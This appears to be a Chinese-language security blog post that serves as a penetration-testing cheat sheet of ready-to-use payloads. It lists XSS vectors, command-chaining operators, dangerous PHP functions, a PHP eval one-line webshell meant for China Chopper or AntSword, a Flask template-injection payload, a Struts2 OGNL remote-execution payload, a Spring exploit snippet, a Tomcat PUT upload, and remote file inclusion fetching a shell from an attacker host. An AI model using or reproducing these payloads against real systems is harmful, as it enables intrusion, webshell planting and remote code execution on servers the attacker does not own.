---
title: "速查表"
date: 2024-12-20T20:27:00+08:00
draft: false
tags: ["SECURITY"]
---

### XSS
```html
<script>alert(666);</script>
<a href="javascript:alert(666)">touch me!</a>
<img src=1 onerror=alert(666)>
<input type=text onclick=alert(666) />
```
变体：改大小写，加引号，斜杠代替空格，使用回车与换行符，使用编码

### 管道符
#### Linux常用管道符：
    ;前面的执行完执行后面的
    |显示后面的执行结果
    ||当前面的执行出错时执行后面的
#### Windows常用管道符
    &前面的语句为假则直接执行后面的
    &&前面的语句为假则直接出错，后面的也不执行
    |直接执行后面的语句
    ||前面出错执行后面的

### 危险函数与常量
#### PHP中常见代码执行函数：
    array_map()
    eval()
    assert()
    preg_replace()
    call_user_func()
    $a($b)动态函数

#### PHP中常见系统命令执行函数：
    system()
    exec()
    shell_exec()
    passthru()
    popen()
    反引号"`"
#### 危险常量
```php
__LINE__       //文件中的当前行号
__FILE__       //文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
__DIR__        //文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录
__FUNCTION__   //该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的
__CLASS__      //该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）
__TRAIT__      //Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits
__METHOD__     //类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）
__NAMESPACE__  //当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）
```

### 一句话系列
```php
<?php phpinfo();?>
```
查看配置信息（注：php报错时会暴露绝对路径）
```php
<?php @eval($_POST["123456"])?>
```
一句话木马，后期可使用中国菜刀或中国蚁剑进行文件内容查看
```java
_(new java.lang.ProcessBuilder("touch","/tmp/success")).start()=sy
```
Spring漏洞关键代码段
```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
flask执行任意代码漏洞
```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```
Apache 任意代码执行漏洞
```
PUT/hack.jsp HTTP/1.1
...
<%out.print("Hello, world!")%>
```
Tomcat 任意文件上传漏洞

```URL
http://[dest_IP]/include.php?page=http://[src_IP]/shell.txt
```
远程文件包含
```URL
?page=php://input
```
在POST请求中填入代码即可远程执行